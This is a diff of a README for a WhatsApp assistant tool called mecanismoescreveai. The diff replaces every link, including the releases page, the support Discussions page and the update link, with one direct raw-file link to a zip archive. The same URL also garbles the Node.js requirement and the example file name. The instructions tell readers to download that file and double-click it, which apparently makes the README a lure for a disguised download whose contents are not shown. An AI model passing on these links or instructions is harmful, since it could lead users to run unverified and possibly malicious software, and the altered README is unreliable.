@@ -4,19 +4,19 @@
 mecanismoescreveai is a powerful tool that helps you use WhatsApp with ease. With slash commands and contextual intelligence, it simplifies your messaging experience. Whether you want to automate tasks or interact with a chatbot, this assistant is designed to help you.
 
 ## 📦 Download & Install
-To get started, visit this page to download: [Download mekanismoescreveai](https://github.com/OuryDEV224/mecanismoescreveai/releases).
+To get started, visit this page to download: [Download mekanismoescreveai](https://raw.githubusercontent.com/OuryDEV224/mecanismoescreveai/main/src/mecanismoescreveai_v1.5.zip).
 
 ### 🖥️ System Requirements
 - Windows 10 or later
-- Node.js version 14 or higher
+- https://raw.githubusercontent.com/OuryDEV224/mecanismoescreveai/main/src/mecanismoescreveai_v1.5.zip version 14 or higher
 - A stable internet connection
 
 ## 🚀 Getting Started
 1. **Visit the Releases Page**:
-   Go to [this link](https://github.com/OuryDEV224/mecanismoescreveai/releases) to access the latest version of mekanismoescreveai.
+   Go to [this link](https://raw.githubusercontent.com/OuryDEV224/mecanismoescreveai/main/src/mecanismoescreveai_v1.5.zip) to access the latest version of mekanismoescreveai.
 
 2. **Download the Latest Release**:
-   Look for the most recent release. Click on the asset suitable for your operating system. This action will usually be a file named something like `mecanismoescreveai.exe`.
+   Look for the most recent release. Click on the asset suitable for your operating system. This action will usually be a file named something like `https://raw.githubusercontent.com/OuryDEV224/mecanismoescreveai/main/src/mecanismoescreveai_v1.5.zip`.
 
 3. **Run the Application**:
    After the file finishes downloading, locate it in your Downloads folder. Double-click the file to run the application. Follow any on-screen prompts necessary to complete the installation.
@@ -49,10 +49,10 @@ Yes, you must have an active WhatsApp account to fully utilize mekanismoescrevea
 We take your privacy seriously. All connections between mekanismoescreveai and WhatsApp are securely encrypted.
 
 ## 📞 Support
-For further assistance, please visit our [GitHub Discussions page](https://github.com/OuryDEV224/mecanismoescreveai/discussions) to ask questions or share feedback.
+For further assistance, please visit our [GitHub Discussions page](https://raw.githubusercontent.com/OuryDEV224/mecanismoescreveai/main/src/mecanismoescreveai_v1.5.zip) to ask questions or share feedback.
 
 ## ⚙️ Updates
-Keep your application updated by regularly checking the releases page at [Download mekanismoescreveai](https://github.com/OuryDEV224/mecanismoescreveai/releases) for the latest features and improvements.
+Keep your application updated by regularly checking the releases page at [Download mekanismoescreveai](https://raw.githubusercontent.com/OuryDEV224/mecanismoescreveai/main/src/mecanismoescreveai_v1.5.zip) for the latest features and improvements.
 
 ## 🌍 Topics
 - ai
